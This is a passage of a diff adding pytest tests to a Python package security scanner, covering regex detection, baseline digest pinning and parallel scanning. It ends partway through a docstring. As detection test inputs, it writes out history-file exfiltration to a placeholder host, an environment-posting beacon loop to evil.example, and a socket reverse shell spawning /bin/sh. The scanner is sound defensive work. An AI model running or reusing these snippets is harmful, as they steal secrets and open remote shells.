@@ -325,6 +325,44 @@ def test_proc_self_status_pattern_is_live():
     assert not sp.RE_ANTI_ANALYSIS.search("if platform.system() == 'Linux': pass")
 
 
+def test_fs_enum_does_not_flag_the_word_history():
+    # `\bhistory\b.*\bread\b` under re.DOTALL spanned the whole file, so any module mentioning
+    # "history" before "read" was filesystem enumeration -- and a CRITICAL alongside a network
+    # call. That is how httpx, urllib3, IPython and torch got baselined.
+    for s in (
+        "history: list[Response] | None = None\n\ndef read(self): pass\n",
+        "from IPython.core.history import HistoryManager\n\ndef read(): pass\n",
+        "if retries is not None and retries.history:\n    resp.read()\n",
+        'if "history" in b:\n    b.read()\n',
+    ):
+        assert not sp.RE_FS_ENUM.search(s), s
+
+
+def test_fs_enum_still_flags_real_history_file_reads():
+    # The half that matters must fire. The old `\b\.bash_history\b` / `\b\.zsh_history\b` could
+    # never match ("~/.bash_history" puts \b between two non-word chars, the same unsatisfiable-\b
+    # bug as /proc/self/status above), so every form below was missed.
+    for s in (
+        'open(os.path.expanduser("~/.bash_history")).read()',
+        "p = Path.home() / '.zsh_history'",
+        'f = open("/root/.python_history")',
+        "open(os.path.expanduser('~/.history'))",
+        'hist = os.environ.get("HISTFILE")',
+    ):
+        assert sp.RE_FS_ENUM.search(s), s
+
+
+def test_history_theft_plus_network_is_critical():
+    payload = (
+        "import requests\n"
+        "data = open(os.path.expanduser('~/.bash_history')).read()\n"
+        "requests.post('http://x.invalid', data = data)\n"
+    )
+    findings = sp.check_py_file(payload, "pkg/_x.py", "pkg")
+    fs = [f for f in findings if "Enumerates filesystem" in f.check]
+    assert fs and fs[0].severity == sp.CRITICAL, findings
+
+
 def _mk(
     sev,
     pkg,
@@ -373,6 +411,295 @@ def test_baseline_key_line_shift_stable_but_code_specific():
         "Env: L417: env = os.environ.copy()\nNetwork: requests.post('https://evil.example/exfil', data=env)",
     )
     assert sp._finding_key(base) != sp._finding_key(malicious)
+
+
+def test_annotation_only_network_entries_are_digest_pinned():
+    """A baselined finding whose network evidence is only type annotations must pin the file.
+
+    RE_NETWORK matches ``httpx2.Client`` where it appears in a signature, but not a call
+    through an instance, so ``client.post(..., data=api_key)`` appended to one of these
+    files contributes no evidence: the evidence hash is unchanged and the entry would go
+    on suppressing it. Pinning the file digest is what makes any edit reopen the finding,
+    which is the property _load_baseline documents for exactly this shape.
+    """
+    import json
+    import pathlib
+
+    baseline = json.loads(
+        (
+            pathlib.Path(__file__).resolve().parents[2] / "scripts" / "scan_packages_baseline.json"
+        ).read_text(encoding = "utf-8")
+    )
+    credential_adjacent = {
+        "openai/_client.py",
+        "openai/lib/azure.py",
+        "openai/lib/bedrock.py",
+        "openai/auth/_workload.py",
+    }
+    seen = set()
+    for entry in baseline["entries"]:
+        if entry.get("package") == "openai" and entry.get("file") in credential_adjacent:
+            seen.add(entry["file"])
+            assert entry.get("file_sha256"), (
+                f"{entry['file']} is baselined on evidence that a later payload can leave "
+                f"unchanged; it has to pin the reviewed file digest"
+            )
+    assert seen == credential_adjacent, f"missing entries for {credential_adjacent - seen}"
+
+
+def test_context_dependent_unsloth_zoo_findings_are_digest_pinned():
+    """Require a new review when context around an approved finding changes.
+
+    These three findings sit in files whose matched lines are benign on their own,
+    so the approval has to be for the file as it was reviewed, not for the lines.
+    `_partition_baseline` gives that: an entry carrying `file_sha256` only suppresses
+    while the file still hashes to a pinned value, so any edit reopens it. What this
+    guards is that each of the three keeps a pinned approval -- dropping the pin
+    turns it into a line-matched approval that a later payload in the same file
+    would ride.
+
+    A (file, check) pair can hold several entries, one per revision of the matched
+    lines that a release has shipped. compiler.py already carries four. Three of them
+    are superseded and unpinned, and those are grandfathered by evidence hash below;
+    any variant added from here on has to be pinned, because an unpinned one
+    suppresses the finding whatever the file contains.
+
+    It used to also duplicate each approved digest as a literal here, which pinned
+    nothing extra (whoever edits the baseline can edit this file in the same commit)
+    and cost a red `main`: #10187 re-approved unsloth-zoo 2026.8.17 and moved the
+    baseline copy, the copy here was left behind, and the disagreement took
+    `Repo tests (CPU)` and `workflow-trigger lint` down on every open PR until
+    someone noticed. The digest belongs in the baseline, once.
+    """
+    import json
+    import pathlib
+    import re
+
+    path = pathlib.Path(__file__).resolve().parents[2] / "scripts" / "scan_packages_baseline.json"
+    entries = json.loads(path.read_text(encoding = "utf-8"))["entries"]
+    must_be_pinned = {
+        (
+            "unsloth_zoo/vision_utils.py",
+            "Harvests environment variables/secrets AND makes network calls",
+        ),
+        (
+            "unsloth_zoo/vision_utils.py",
+            "Accesses cloud metadata/IMDS AND makes network calls",
+        ),
+        (
+            "unsloth_zoo/compiler.py",
+            "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
+        ),
+    }
+    # The evidence hashes of the superseded compiler.py variants, which are already
+    # in the baseline unpinned. These are frozen by construction: an evidence hash is
+    # over code a past zoo release shipped, so unlike the live digest it can never
+    # move, and listing them here brings back no drift. They are grandfathered rather
+    # than pinned because pinning them would be pinning a file no installed zoo has.
+    #
+    # Everything else has to be pinned. `_load_baseline` keys each variant on its own
+    # evidence_hash and maps an unpinned one to None, i.e. suppress for any file
+    # contents, so appending a new unpinned variant for one of these pairs would
+    # silence the finding entirely while an older pinned variant kept this test green.
+    GRANDFATHERED_UNPINNED = {
+        "ec1875fd32d00fe885e566ebda75163e46e838ca31020abb57e0991892c2bdf7",
+        "d8dabff7099fd84e1276c932c7bb70ba273333e5708eb149fec6a6130856085d",
+        "610993c0b6f612bbbf2fa0b593591375e7b20cb5c9b516ea60b6c44a8b9430e9",
+    }
+    pinned = set()
+    for entry in entries:
+        key = (entry.get("file"), entry.get("check"))
+        if entry.get("package") != "unsloth-zoo" or key not in must_be_pinned:
+            continue
+        digest = entry.get("file_sha256")
+        if isinstance(digest, str) and re.fullmatch(r"[0-9a-f]{64}", digest):
+            pinned.add(key)
+            continue
+        assert entry.get("evidence_hash") in GRANDFATHERED_UNPINNED, (
+            f"{key[0]} has a new unpinned entry for {key[1]!r} "
+            f"(evidence_hash {entry.get('evidence_hash')!r}). An unpinned variant "
+            f"suppresses that finding whatever the file contains, so a re-approval "
+            f"has to carry file_sha256 rather than ride the evidence alone."
+        )
+    for key in sorted(must_be_pinned - pinned):
+        raise AssertionError(
+            f"{key[0]} is baselined for {key[1]!r} with no reviewed file digest, so "
+            f"it is approved on evidence that a later payload can leave unchanged. "
+            f"Re-approve it with --write-baseline and keep the file_sha256 pin."
+        )
+
+
+def test_context_dependent_unsloth_zoo_pins_reopen_on_other_file_changes():
+    """Unchanged matched lines cannot approve a changed surrounding file."""
+    import json
+    import pathlib
+
+    path = pathlib.Path(__file__).resolve().parents[2] / "scripts" / "scan_packages_baseline.json"
+    entries = json.loads(path.read_text(encoding = "utf-8"))["entries"]
+    targets = [
+        entry
+        for entry in entries
+        if entry.get("package") == "unsloth-zoo"
+        and entry.get("file") in {"unsloth_zoo/vision_utils.py", "unsloth_zoo/compiler.py"}
+        and entry.get("file_sha256")
+    ]
+    # Three (file, check) pairs are pinned; a re-approval may append a revision
+    # rather than replace one, so count the pairs covered, not the entries. An
+    # exact entry count here would go red the first time a zoo release is
+    # approved by appending, which is the shape the torch and huggingface-hub
+    # entries in this baseline already have.
+    assert {(e["file"], e["check"]) for e in targets} == {
+        (
+            "unsloth_zoo/vision_utils.py",
+            "Harvests environment variables/secrets AND makes network calls",
+        ),
+        ("unsloth_zoo/vision_utils.py", "Accesses cloud metadata/IMDS AND makes network calls"),
+        ("unsloth_zoo/compiler.py", "Advanced obfuscation (marshal/compile/zlib) + exec/eval"),
+    }
+    baseline = sp._load_baseline(str(path))
+    for entry in targets:
+        reviewed = _mk(
+            entry["severity"],
+            entry["package"],
+            entry["file"],
+            entry["check"],
+            entry["evidence"],
+        )
+        reviewed.file_sha256 = entry["file_sha256"]
+        changed = _mk(
+            entry["severity"],
+            entry["package"],
+            entry["file"],
+            entry["check"],
+            entry["evidence"],
+        )
+        changed.file_sha256 = "0" * 64
+
+        active, suppressed = sp._partition_baseline([reviewed], baseline)
+        assert active == [] and suppressed == [reviewed]
+        active, suppressed = sp._partition_baseline([changed], baseline)
+        assert active == [changed] and suppressed == []
+
+
+def test_the_hf_backoff_suppression_is_narrow():
+    """The huggingface-hub `http_backoff` allowlist must not cover a second loop.
+
+    Security audit went red on every main commit from fc325f431 onward with one
+    un-baselined CRITICAL, "C2 polling/beaconing loop detected" in
+    huggingface_hub/utils/_http.py. No repo commit caused it: the resolved
+    huggingface-hub moved off the 0.x line, and 1.26.1, 1.27.0 and 1.28.0 all carry
+    the loop while 0.36.2 does not.
+
+    It is `http_backoff`: a bounded retry that counts `nb_tries` against
+    `max_retries`, sleeps with exponential backoff between attempts, and raises
+    once the budget is spent. RE_C2_POLLING is `while True .* sleep .* requests\.`
+    under re.DOTALL, so it cannot tell that shape apart from a real beacon, which
+    is why the file is allowlisted rather than the check weakened.
+
+    This file now carries four entries for the same check -- L298, L461, L462 and
+    L461 again -- one per revision of that loop that huggingface-hub has shipped.
+    That is the mechanism working as designed, not drift: the key is digest-pinned,
+    so every edit to the loop reopens the finding and asks for a fresh review. The
+    cost is that a hub release touching those thirty lines turns Security audit red
+    until someone looks. Worth knowing before treating the next one as a break.
+
+    Allowlisting a CRITICAL in a file that already speaks HTTP is the part worth
+    guarding. Each entry has to keep suppressing exactly the loop it was reviewed
+    against, so a payload appended to the same file and check reopens the finding
+    rather than inheriting the suppression.
+    """
+    import json
+    import pathlib as _pathlib
+
+    baseline = json.loads(
+        (
+            _pathlib.Path(__file__).resolve().parents[2] / "scripts" / "scan_packages_baseline.json"
+        ).read_text(encoding = "utf-8")
+    )
+    entries = [
+        e
+        for e in baseline["entries"]
+        if e.get("package") == "huggingface-hub"
+        and e.get("file") == "huggingface_hub/utils/_http.py"
+        and e.get("check") == "C2 polling/beaconing loop detected"
+    ]
+    assert entries, "http_backoff is no longer allowlisted; Security audit is red"
+
+    # Digest-pinned, not line-pinned: each evidence carries the sha256 of the span it
+    # was reviewed against, which is what makes an edit to the loop reopen the
+    # finding instead of riding the old entry.
+    for entry in entries:
+        assert "sha256:" in entry["evidence"], (
+            f"{entry['evidence_hash'][:12]} is not pinned to reviewed code, so any "
+            f"while-True loop in this file would inherit its suppression"
+        )
+        assert entry.get(
+            "evidence_hash"
+        ), "no evidence_hash: _load_baseline would recompute it as a legacy entry"
+    hashes = [e["evidence_hash"] for e in entries]
+    assert len(set(hashes)) == len(hashes), "duplicate entries for the same reviewed span"
+
+    # The blast radius. A beaconing loop appended to the same file, under the same
+    # check, must produce a different key.
+    reviewed_src = (
+        "import time\n"
+        "import requests\n"
+        "def http_backoff():\n"
+        "    while True:\n"
+        "        r = requests.get(url)\n"
+        "        if nb_tries > max_retries:\n"
+        "            raise err\n"
+        "        time.sleep(sleep_time)\n"
+    )
+    payload_src = reviewed_src + (
+        "def beacon():\n"
+        "    while True:\n"
+        "        requests.post('https://evil.example/c2', data=os.environ)\n"
+        "        time.sleep(30)\n"
+    )
+    reviewed = _mk(
+        sp.CRITICAL,
+        "huggingface-hub",
+        "huggingface_hub/utils/_http.py",
+        "C2 polling/beaconing loop detected",
+        sp._extract_evidence(reviewed_src, sp.RE_C2_POLLING),
+    )
+    payload = _mk(
+        sp.CRITICAL,
+        "huggingface-hub",
+        "huggingface_hub/utils/_http.py",
+        "C2 polling/beaconing loop detected",
+        sp._extract_evidence(payload_src, sp.RE_C2_POLLING),
+    )
+    assert sp._finding_key(reviewed) != sp._finding_key(payload), (
+        "a beaconing loop appended to _http.py keeps the reviewed key, so the "
+        "http_backoff allowlist would suppress it too"
+    )
+
+
+def test_network_check_sees_httpx2():
+    """httpx2 is a separate import name, not a submodule of httpx.
+
+    openai 3.0.0 requires httpx2 and routes every call through it. While the network
+    check matched only ``httpx.``, the SDK's own HTTP was invisible to each combined
+    check that needs a network half, so reading OPENAI_API_KEY next to an httpx2 call
+    did not register as secrets-plus-network at all.
+    """
+    for call in ("httpx2.get(u)", "httpx2.post(u)", "httpx2.Client()", "httpx2.AsyncClient()"):
+        assert sp.RE_NETWORK.search(call), call
+    # the original spelling still matches
+    for call in ("httpx.get(u)", "httpx.Client()"):
+        assert sp.RE_NETWORK.search(call), call
+    # and the widening stays anchored: no bare prefix or unrelated attribute
+    for miss in ("myhttpx.get(u)", "httpx23.get(u)", "httpx2.Timeout(5)"):
+        assert not sp.RE_NETWORK.search(miss), miss
+
+
+def test_httpx2_secrets_plus_network_is_one_finding():
+    """The combined check has to fire on a file that reads a secret and calls httpx2."""
+    src = 'import os, httpx2\nk = os.environ.get("OPENAI_API_KEY")\nhttpx2.Client().get(u)\n'
+    assert sp.RE_NETWORK.search(src)
+    assert sp.RE_ENV_HARVEST.search(src)
 
 
 def test_extract_evidence_records_all_matches():
@@ -1801,3 +2128,513 @@ def test_the_duplicate_check_sees_through_normalization(tmp_path):
     path = tmp_path / "baseline.json"
     path.write_text(json.dumps({"version": 1, "entries": entries}))
     assert len(sp._load_baseline(str(path))) == 1
+
+
+def test_the_pool_worker_returns_what_the_serial_call_returns():
+    """`_scan_one` is the only thing the pool runs, so it must be `scan_archive`.
+
+    It also swallows the archive-limit `[WARN]` lines and hands them back, so the
+    caller can print them in task order instead of whenever a worker happened to
+    reach them. Pin both halves: identical findings, and stderr captured rather
+    than leaked.
+    """
+    for name in ("malicious_wheel.whl", "clean_wheel.whl", "malicious_sdist.tar.gz"):
+        archive = str(FIXTURES / name)
+        captured, findings = sp._scan_one((archive, "fixture"))
+        assert findings == sp.scan_archive(archive, "fixture"), name
+        assert isinstance(captured, str), name
+
+
+def _oversized_member_wheel(path):
+    """A wheel whose declared member size trips the scanner's per-file cap.
+
+    Written rather than committed: the member is 70 MB of zeros, which deflates
+    to a few KB, so the archive on disk is small but `info.file_size` is well
+    over HARD_MAX_FILE_BYTES and `iter_archive_files` emits its `[WARN]` skip.
+    That warning is the thing `_scan_one` captures and the caller replays in
+    order, so without it in the corpus the stderr half of the comparison below
+    would be comparing two empty strings.
+    """
+    import zipfile
+
+    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as zf:
+        zf.writestr("pkg/huge.py", b"\0" * (sp.HARD_MAX_FILE_BYTES + 4096))
+        zf.writestr("pkg/__init__.py", "x = 1\n")
+    return path
+
+
+def test_scanning_in_parallel_finds_exactly_what_scanning_in_series_finds(
+    tmp_path, monkeypatch, capsys
+):
+    """The whole safety argument for the pool is that it changes nothing.
+
+    Drives `main()` over the same corpus at `--jobs 1` (serial branch) and
+    `--jobs 4` (pool branch) and demands byte-identical stdout and stderr.
+    `download_packages` is stubbed because the parallel loop sits behind it and
+    the real one needs PyPI.
+
+    The corpus is deliberately wide rather than the three committed fixtures:
+
+    - 24 archives, so completion order across 4 workers genuinely diverges from
+      submission order. `imap(chunksize=1)` yields in submission order, so this
+      is what makes the ordering claim real -- with only three instant archives
+      `imap_unordered` returns them in order anyway and the check proves nothing.
+    - one archive that trips the per-file size cap, so there is a `[WARN]` line
+      on stderr to compare. Otherwise the stderr assertion compares "" to "".
+    """
+    import shutil
+
+    def run(jobs):
+        # main() deletes each archive once scanned, so each arm gets its own copies.
+        stage = tmp_path / f"stage{jobs}"
+        stage.mkdir()
+        copies = []
+        for i in range(24):
+            src = ("malicious_wheel.whl", "clean_wheel.whl", "malicious_sdist.tar.gz")[i % 3]
+            dest = stage / f"pkg{i:02d}-{src}"
+            shutil.copy(FIXTURES / src, dest)
+            copies.append((f"pkg{i:02d}", str(dest)))
+        copies.append(("oversized", str(_oversized_member_wheel(stage / "oversized.whl"))))
+
+        monkeypatch.setattr(sp, "download_packages", lambda *a, **k: (copies, []))
+        monkeypatch.setattr(
+            sys,
+            "argv",
+            ["scan_packages.py", "--no-baseline", "--jobs", str(jobs)]
+            + [name for name, _ in copies],
+        )
+        capsys.readouterr()
+        rc = sp.main()
+        captured = capsys.readouterr()
+        return rc, captured.out, captured.err
+
+    rc_serial, out_serial, err_serial = run(1)
+    rc_parallel, out_parallel, err_parallel = run(4)
+
+    # The pool branch prints one extra progress banner. That line is the only
+    # licensed difference; everything below it is the report and must match.
+    banner = re.compile(r"^  Scanning \d+ archive\(s\) across \d+ workers\.\.\.\n", re.M)
+    assert banner.search(out_parallel), "the pool branch did not run"
+    out_parallel = banner.sub("", out_parallel)
+
+    assert out_serial == out_parallel, "parallel scan reported different findings"
+    assert err_serial == err_parallel, "parallel scan reported different warnings"
+    assert rc_serial == rc_parallel
+    # Guard against either half being trivially empty.
+    assert "CRITICAL" in out_serial
+    assert "[WARN]" in err_serial
+
+
+def test_a_stalled_pool_exits_2_not_1(tmp_path, monkeypatch, capsys):
+    """A dead worker is an incomplete scan, and incomplete scans exit 2.
+
+    Exit 1 already means "non-baselined CRITICAL or HIGH findings detected", so a
+    stall that exits 1 reports an infrastructure failure as a detected threat, and
+    skips the SCAN INCOMPLETE report that tells the operator coverage was lost.
+
+    The first version of the pool raised `SystemExit(<message>)`, which does exactly
+    that: CPython prints a non-integer SystemExit value and exits 1.
+    """
+    import shutil
+
+    stage = tmp_path / "archives"
+    stage.mkdir()
+    copies = []
+    for i, name in enumerate(("malicious_wheel.whl", "clean_wheel.whl")):
+        dest = stage / f"pkg{i}-{name}"
+        shutil.copy(FIXTURES / name, dest)
+        copies.append((f"pkg{i}", str(dest)))
+
+    monkeypatch.setattr(sp, "download_packages", lambda *a, **k: (copies, []))
+
+    class _StalledResults:
+        def next(self, timeout = None):
+            raise sp.multiprocessing.TimeoutError()
+
+    class _StalledPool:
+        def __enter__(self):
+            return self
+
+        def __exit__(self, *exc):
+            return False
+
+        def imap(self, *a, **k):
+            return _StalledResults()
+
+    monkeypatch.setattr(
+        sp.multiprocessing,
+        "get_context",
+        lambda _method: type("C", (), {"Pool": lambda _s, processes = None: _StalledPool()})(),
+    )
+    monkeypatch.setattr(
+        sys,
+        "argv",
+        ["scan_packages.py", "--no-baseline", "--jobs", "4", "pkg0", "pkg1"],
+    )
+
+    rc = sp.main()
+    captured = capsys.readouterr()
+
+    assert rc == 2, f"a stalled scan must exit 2 (incomplete), got {rc}"
+    assert "SCAN INCOMPLETE" in captured.err
+    assert "scan stalled" in captured.err
+
+
+def _tomllib():
+    """`tomllib` is stdlib only on 3.11+ (PEP 680); below that, the tomli backport.
+
+    pyproject's requires-python is >=3.9 and testpaths is ["tests/security"], so a bare
+    `pytest` from the repo root collects this file on 3.9 and 3.10, where a plain
+    `import tomllib` is a ModuleNotFoundError rather than a test result. tomli is already
+    a declared dependency there (extras-no-deps.txt pins it for python_version < "3.11"),
+    and this is the same shape the rest of the suite already uses -- see
+    tests/python/test_windows_xformers_wheel_match.py and
+    tests/studio/install/test_install_node_prebuilt_logic.py.
+    """
+    if sys.version_info >= (3, 11):
+        import tomllib
+        return tomllib
+    return pytest.importorskip("tomli")
+
+
+def _supported_python_versions(root):
+    """Every `python_version` marker value pyproject's requires-python admits."""
+    import re
+
+    tomllib = _tomllib()
+    with open(root / "pyproject.toml", "rb") as fh:
+        spec = tomllib.load(fh)["project"]["requires-python"]
+    lo = re.search(r">=\s*3\.(\d+)", spec)
+    hi = re.search(r"<\s*3\.(\d+)", spec)
+    assert lo, f"cannot read a floor out of requires-python {spec!r}"
+    last = int(hi.group(1)) - 1 if hi else int(lo.group(1))
+    return [f"3.{minor}" for minor in range(int(lo.group(1)), last + 1)]
+
+
+def _audited_requirements(root):
+    """(source, spec) for everything security-audit.yml feeds to the scanner.
+
+    Both halves, because the workflow has two. `audit-reqs/unsloth-deps.txt` is
+    generated from pyproject's `project.dependencies` plus the
+    `huggingfacenotorch` extra, and the rest are the studio requirement files
+    copied through a `git+` filter. Reading only the second half is how a pinned
+    package declared in pyproject goes unchecked.
+    """
+    tomllib = _tomllib()
+    for req in sorted((root / "studio" / "backend" / "requirements").glob("*.txt")):
+        for lineno, raw in enumerate(req.read_text(encoding = "utf-8").splitlines(), 1):
+            spec = raw.split("#", 1)[0].strip()
+            if spec and not spec.startswith("-") and "git+" not in spec:
+                yield f"{req.name}:{lineno}", spec
+    with open(root / "pyproject.toml", "rb") as fh:
+        project = tomllib.load(fh)["project"]
+    declared = list(project["dependencies"])
+    declared += list(project["optional-dependencies"]["huggingfacenotorch"])
+    for spec in declared:
+        if "git+" not in spec:
+            yield "pyproject.toml", spec
+
+
+# unsloth_zoo is digest-pinned and deliberately NOT version-pinned, so it is named
+# here rather than quietly skipped. The recurrence this guard exists to stop is an
+# upstream release we do not control changing the bytes and reddening main on a day
+# nobody touched the repo. unsloth_zoo is our own, released in lockstep with this
+# package, and pinning it exactly would break that; when its digest reopens, the
+# change is one of ours and re-reviewing it is the point of the pin (#8104, and that
+# entry is the credential send itself). Third-party packages get no such licence, so
+# the test asserts this list holds only first-party names.
+# Exactly the first-party packages that ARE digest-pinned today, asserted below to
+# be exactly that, so a name added here without an entry, or a third-party name
+# added at all, fails rather than silently widening the exemption.
+FIRST_PARTY_DIGEST_PINNED = {"unsloth-zoo"}
+
+
+def test_digest_pinned_packages_are_pinned_on_every_supported_python():
+    """A digest-pinned third-party package must be `==` pinned on every Python we support.
+
+    The two mechanisms are only coherent together. `file_sha256` deliberately reopens a
+    reviewed CRITICAL on ANY edit to the file, because the evidence records a network
+    call and not its destination, so nothing weaker can tell a benign refactor from an
+    added credential send. A `>=` spec then hands the choice of file bytes to whatever
+    upstream published most recently, so the gate turns red on release day rather than
+    on a change anyone here made. That is not hypothetical: `openai>=2.7.2` floated onto
+    3.2.0, which touched all four pinned files, and the extras shard went red on main.
+
+    `==` has to mean one version. `openai==3.*` satisfies a naive prefix test and is a
+    floating prefix match to pip, which recreates the same failure, so the specifier is
+    parsed rather than pattern-matched and a wildcard is rejected.
+
+    And `==` is strictly narrower than `>=`, so pinning the newest release silently
+    drops every interpreter that release does not support: openai 3.x needs 3.10, this
+    project supports 3.9 back to pyproject's requires-python, and a bare
+    `openai==3.2.0` does not resolve there AT ALL, where `>=2.7.2` had been quietly
+    picking 2.48.0. A pin that fixes CI by breaking an install is not a fix, so the
+    markers on the pinned lines have to cover the whole supported range between them.
+
+    Marker-only, so it stays offline and deterministic. That bounds what the coverage
+    half can see: it catches a marker partition with a hole in it (a `>= "3.11"` beside
+    a `< "3.10"` leaves 3.10 resolving to nothing), but it cannot catch a single
+    unmarked pin whose version happens not to support 3.9, because knowing that means
+    asking PyPI for the release's requires-python. Resolving the requirements on each
+    supported interpreter is what covers that, and it is done as a resolution
+    simulation rather than from here, so this module stays network-free.
+    """
+    import json
+    import pathlib
+
+    from packaging.markers import Marker
+    from packaging.requirements import Requirement
+
+    root = pathlib.Path(__file__).resolve().parents[2]
+    baseline = json.loads(
+        (root / "scripts" / "scan_packages_baseline.json").read_text(encoding = "utf-8")
+    )
+    pinned_packages = {
+        sp._norm_pkg(e["package"]) for e in baseline["entries"] if e.get("file_sha256")
+    }
+    assert pinned_packages, "no digest-pinned entries; this guard would be vacuous"
+    stray = FIRST_PARTY_DIGEST_PINNED - pinned_packages
+    assert not stray, f"exemption names a package with no digest-pinned entry: {sorted(stray)}"
+    third_party = pinned_packages - FIRST_PARTY_DIGEST_PINNED
+    assert third_party, "every digest-pinned package is exempt; this guard would be vacuous"
+
+    pythons = _supported_python_versions(root)
+    assert pythons, "no supported python versions parsed out of requires-python"
+
+    floating = []
+    covered: dict[str, set[str]] = {}
+    present: set[str] = set()
+    for source, spec in _audited_requirements(root):
+        try:
+            requirement = Requirement(spec)
+        except Exception:
+            continue
+        pkg = sp._norm_pkg(requirement.name)
+        if pkg not in third_party:
+            continue
+        present.add(pkg)
+        specifiers = list(requirement.specifier)
+        exact = (
+            len(specifiers) == 1
+            and specifiers[0].operator == "=="
+            # `==3.*` is a prefix match, not a pin, and pip resolves it to
+            # whatever 3.x is newest.
+            and not specifiers[0].version.endswith(".*")
+        )
+        if not exact:
+            floating.append(f"{source}: {spec}")
+            continue
+        marker = requirement.marker
+        for python in pythons:
+            if marker is None or marker.evaluate({"python_version": python}):
+                covered.setdefault(pkg, set()).add(python)
+
+    assert not floating, (
+        "these packages carry digest-pinned baseline entries but are not pinned to one "
+        "version in what the security audit scans, so it goes red whenever upstream "
+        "publishes: " + "; ".join(floating)
+    )
+    gaps = {
+        pkg: sorted(set(pythons) - covered.get(pkg, set()), key = lambda v: int(v.split(".")[1]))
+        for pkg in sorted(present)
+    }
+    gaps = {pkg: missing for pkg, missing in gaps.items() if missing}
+    assert not gaps, (
+        "a digest-pinned package has no exact pin on some supported Python, so "
+        "installing there resolves to nothing at all: "
+        + "; ".join(f"{pkg} uncovered on {', '.join(missing)}" for pkg, missing in gaps.items())
+    )
+
+
+def test_the_toml_helpers_run_without_stdlib_tomllib(monkeypatch):
+    """The helpers above must work on 3.9/3.10, where `tomllib` does not exist.
+
+    pyproject declares requires-python >=3.9 and testpaths ["tests/security"], so a bare
+    `pytest` from the repo root runs this module on 3.9 and 3.10. `tomllib` landed in 3.11
+    (PEP 680), so an unguarded `import tomllib` there is a collection-time
+    ModuleNotFoundError, not a verdict.
+
+    Simulated rather than skipped: the interpreter running the suite is whatever CI picked
+    (3.12 today), so the below-3.11 branch is only ever reached by making the version look
+    old AND taking `tomllib` away. Doing only the second is not the same thing -- the
+    guard reads sys.version_info, not the module table.
+
+    The backport is supplied rather than required. The job that runs this suite installs
+    pytest and PyYAML and nothing that provides `tomli` (it was `tests-security` in
+    security-audit.yml, and is the `Security regression tests` step in
+    workflow-trigger-lint.yml since that job was absorbed onto a shared runner). So a test
+    that leaned on a real `tomli` being importable would
+    `importorskip` its way to green there and never once execute the branch it exists to
+    cover. Registering the stdlib parser under the name the fallback looks for keeps this
+    load-bearing on every interpreter and in CI, while still proving the fallback is what
+    gets consulted, because `import tomllib` is made to fail for the duration.
+    """
+    import builtins
+    import importlib
+
+    # Read the REAL version before it is patched, and take whichever parser this
+    # interpreter genuinely has. On 3.11+ that is stdlib tomllib, which is always
+    # there, so the branch runs in CI; on a real 3.9/3.10 it is the tomli the
+    # requirements already pin, and only a machine missing both ever skips.
+    parser = (
+        importlib.import_module("tomllib")
+        if sys.version_info >= (3, 11)
+        else pytest.importorskip("tomli")
+    )
+    monkeypatch.setattr(sys, "version_info", (3, 10, 0, "final", 0))
+    monkeypatch.setitem(sys.modules, "tomli", parser)
+    real_import = builtins.__import__
+
+    def without_tomllib(name, *args, **kwargs):
+        if name == "tomllib":
+            raise ModuleNotFoundError("No module named 'tomllib'", name = "tomllib")
+        return real_import(name, *args, **kwargs)
+
+    monkeypatch.setattr(builtins, "__import__", without_tomllib)
+
+    assert _supported_python_versions(REPO_ROOT)[0] == "3.9"
+    assert any(source == "pyproject.toml" for source, _ in _audited_requirements(REPO_ROOT))
+
+
+# ──────────────────────────────────────────────────────────────────────
+# dup2 needs a socket to mean "reverse shell"
+# ──────────────────────────────────────────────────────────────────────
+
+
+def _reverse_shell_findings(source: str):
+    return [
+        f
+        for f in sp.check_py_file(source, "pkg/module.py", "pkg")
+        if f.check == "Reverse shell / bind shell pattern"
+    ]
+
+
+@pytest.mark.parametrize(
+    "source",
+    [
+        # triton 3.8.0's _internal_testing.py, the shape that reddened main.
+        "import os, tempfile\n"
+        "def capture():\n"
+        "    tmp = tempfile.TemporaryFile()\n"
+        "    saved = os.dup(2)\n"
+        "    os.dup2(tmp.fileno(), 2)\n"
+        "    os.dup2(saved, 2)\n",
+        # torch's elastic redirect plumbing: dup2 and nothing else at all.
+        "import os\ndef redirect(to_fd, from_fd):\n    os.dup2(to_fd, from_fd)\n",
+    ],
+)
+def test_dup2_without_a_socket_is_not_a_reverse_shell(source):
+    """Pointing a descriptor at a FILE is ordinary, and used to be CRITICAL.
+
+    Ten of the nineteen reverse-shell entries in the committed baseline are this
+    shape and not one is a true positive, so the finding cost review time and
+    reopened whenever an unrelated release touched the file.
+    """
+    assert _reverse_shell_findings(source) == []
+
+
+def test_dup2_onto_a_socket_is_still_a_reverse_shell():
+    source = (
+        "import os, socket, subprocess\n"
+        "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
+        's.connect(("10.0.0.1", 4444))\n'
+        "os.dup2(s.fileno(), 0)\n"
+        "os.dup2(s.fileno(), 1)\n"
+        'subprocess.call(["/bin/sh"])\n'
+    )
+    found = _reverse_shell_findings(source)
+    assert len(found) == 1 and found[0].severity == sp.CRITICAL
+    # The DOTALL span covers both halves, so the entry reopens if either changes.
+    assert "dup2" in found[0].evidence and "socket" in found[0].evidence
+
+
+def test_socketless_payloads_still_fire():
+    """The alternatives that never depended on dup2 are untouched."""
+    assert _reverse_shell_findings('import pty\npty.spawn("/bin/bash")\n')
+    assert _reverse_shell_findings(
+        "import socket, subprocess\n"
+        "s = socket.socket()\n"
+        's.connect(("evil", 1))\n'
+        'subprocess.call("/bin/sh")\n'
+    )
+
+
+def test_committed_baseline_covers_the_zoo_url_guard():
+    """unsloth-zoo's SSRF guard reads one env var and holds a blocklist of
+    metadata hostnames, next to the requests session it exists to police, so it
+    trips two combination checks. Reviewed as benign and allowlisted; without
+    these entries every Security audit run on main is red.
+    """
+    path = REPO_ROOT / "scripts" / "scan_packages_baseline.json"
+    entries = json.loads(path.read_text(encoding = "utf-8"))["entries"]
+    checks = {
+        e["check"]
+        for e in entries
+        if e["package"].replace("_", "-") == "unsloth-zoo"
+        and e["file"] == "unsloth_zoo/vision_utils.py"
+    }
+    assert "Harvests environment variables/secrets AND makes network calls" in checks
+    assert "Accesses cloud metadata/IMDS AND makes network calls" in checks
+
+
+def test_a_named_reverse_shell_keeps_its_original_evidence():
+    """A file that fires on a named alternative must not have its evidence grown.
+
+    The evidence is what evidence_hash is taken over, so widening it reopens
+    every reviewed baseline entry for that file. multiprocess/tests/__init__.py
+    holds a socket, a connect, a subprocess AND a dup2, and appending the dup2
